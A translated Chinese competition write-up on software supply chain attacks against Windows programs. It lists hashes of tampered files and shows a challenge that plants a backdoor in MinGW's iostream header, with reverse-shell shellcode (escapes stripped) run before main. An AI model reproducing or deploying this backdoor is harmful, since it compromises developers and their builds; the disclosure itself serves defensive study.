# ‘功守道’软件供应链安全大赛·PE二进制赛季启示录
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 因图片较大，图片文件打包后传至云盘附在文章结尾，请下载查看原图。
## 0\. 在一切开始前
诚信声明
虽是老生常谈，但安全的同一水位面前，木桶永远有长板短板，风险值得最高警惕。如前文所比喻，软件供应链安全的问题，无异于潘多拉的盒子。我们的比赛，通过在限定框架范围，打开魔盒释放出一定、低害但超出早先人们认知的程序恶意，将其公之于众，以使得人们对其不再毫无防备，从而能够前摄性的研发对应的解决之道。
因此类似针对C源代码赛季的要求，在此我们仍需要特别强调：本文中所列举的所有恶意代码，仅用于彰显那些当前有安全人员可能想到的恶意行为；考虑到真正的威胁永远源于未知，这些题目所搭载的恶意行为类型，实质上在曝光的同时就已经失去最大威胁，但由于信息不对等，在真实场景仍然可能会被利用。所以所有读者需要在阅读同时，自我保证绝不会将这里的思路，以及由此延展出的思维用于真实场景。
赛题处理与披露
考虑到本次比赛赛题不是传统恶意软件，由主流杀毒软件引擎无法检出，为防止流失到社会上造成真实风险，组织方尽量保证题目不传播、不外泄、可判别。
软件在启动过程中增加了弹框进行“软件特殊场景拷贝、存在恶意代码”的警示，并对启动过程相关函数进行加壳混淆，初步保证无法直接将二进制程序文件被直接流失到外部扩散使用。除此以外，我们将三款被修改软件中存在恶意代码片段的文件SHA256公开，用以引导业界相关检测方对这些文件的发现和响应：
    “# Code::Blocks 
    f8f59f4a417a1cc6006a0826ae8863e64f565df8478657a8635a9d321c908539 autorevision.exe
    22808cb74a5e038958813d999ae214b06d08321f597ee436a1e8c53716c2dccc cb_console_runner.exe
    6eeca307be321870c6a0a0c91f0665649e2470334e7372dd9701d91545fd6660 codeblocks.dll
    8bceffd76ddfab3861c657695765bc1bdc092617cd677cd63a1cf5f7e7fec146 codeblocks.exe
    1339b2de06cf83b2f7c6f83b48f1bc8a3d64f696788293e86c4a0dea4a62274c abbreviations.dll
    f9ab0deb5c87aefec6c32589c640de1a06838d5cdcc5cac7ca251623053bf2d4 autosave.dll
    4517a8bdd5993d2b438cefafe2c06e2dc3baba6b6194bb3a9dd2bf36f764d636 classwizard.dll
    9f1a28d998343a6395c3bb07cc92d893e076f0ba89f50e4f7fc7b622910a7b7f defaultmimehandler.dll
    5cfcb7f143f11e7b152d546da36031a7464e112e0fa056e99a8af9fb563bd01e debugger.dll
    1bc7cc00b2325c358c018e64e5aa8de4cb3db962ccd529929544a33ca262977e compiler.dll
    06e0a16353d50e03e9f7026b58f5317e27c1925aa0465551a4b091dfe87583d3 EditorConfig.dll
    b92b5be5da0fa1b01d823a8dab1b73f45e984c274a0b17b3938495dcd485f976 FileManager.dll
    249ed7e1c91f7289487f28b2dcc759e6eea2615a63a255b906a9f543f0690c23 openfileslist.dll
    f90c8fd13af6347a408ddb968ebc7560240ef053bb9f52f461a25ee33f1b9153 xpmanifest.dll”
    “# ConEmu 
    887f4627e0da26a50851634ecef7106bbcc5b1db3a510450cad2757edf4d333d ConEmu.exe
    4f71dbf6f95a3702d81de7eb7f1f7470821bad58d944f922033900b3a58e63ea ConEmuC.exe
    37e66ee0b610e2070bb3eca935805e96a9dc12a49ddf03eca550777d184d05e3 ConEmuCD.dll”
    _“# eMule_ 
    09e6a93b6cc560f3d50482415cd95d0dabe993a3a8c8f2912ffb6d73b95d4f66 emule.exe”  
## 1\. 出招！蓝军出题方经典题目赏析
在本节中，我们将精选一些出题方的题目进行展示。其中一些具有代表性，透露出所有参赛队在考虑针对PE可执行文件、针对Windows系统、针对个人办公和开发软件环境这个限定的场景下，结合经验、发挥脑洞之下，能够设想出来的软件供应链新型攻击的一般模式和套路；而另有一些具有突破性，是令组织方收齐题目看到后也非常赞叹其立意之新颖、实现之巧妙的题目。希望通过这有限几道题目的展示，能够让大家对于这一限定场景下威胁的真实性、迫切性、发散性，有和我们相同的感知。
###  开发环境污染1：从“头”做起
在第一轮比赛，选定的载体是Code::Blocks，一方面限定了题目本身需要从这样的IDE环境中触发，一方面提供了可以将围绕这款软件以及一般性的开发环境为攻击、污染目标的想象空间。
这里的第一道题目形式较为简单，思路非常经典。恶意代码存在于Code::Blocks的一款官方插件autosave中，题目部分代码如下：
该题的最终目的是使任何通过 MinGW 编译后的项目都存在攻击者放置的后门。IDE 里的投毒代码在自动保存时触发，通过向软件自带安装的 MinGW
默认路径(C:Program Files
(x86)CodeBlocksMinGWlibgccmingw325.1.0includec++iostream)的头文件放入恶意代码，使得任何经过该
MinGW 编译且包含了 iostream 的项目存在攻击者放置的后门。
iostream 中的后门将先于 main 函数执行，实现方式为在 iosteam 中添加如下代码：
    class AliSoftSec {
    public:
    AliSoftSec() {
    unsigned char code[] = “x68x7fx01x01x01x5ex66x68xd9x03x5fx6ax66x58x99x6ax01x5bx52x53x6ax02x89xe1xcdx80x93x59xb0x3fxcdx80x49x79xf9xb0x66x56x66x57x66x6ax02x89xe1x6ax10x51x53x89xe1xcdx80xb0x0bx52x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x52x53xebxce”;
    int (ret)() = (int ()()) code;
    ret();
    }
    } softsec;